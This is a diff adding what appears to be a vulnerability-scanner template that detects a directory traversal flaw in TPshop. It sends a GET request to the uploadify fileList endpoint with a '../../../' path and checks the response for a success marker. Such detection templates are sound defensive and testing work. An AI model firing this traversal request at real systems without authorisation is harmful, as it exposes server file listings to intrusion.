@@ -1,0 +1,24 @@
+id: tpshop-directory-traversal
+brief:
+    title: TPshop - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: TPshop is vulnerable to local file inclusion.
+    label:
+        - tpshop
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../'
+      signs:
+        - "on": word
+          has:
+            - '"state":"SUCCESS"'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
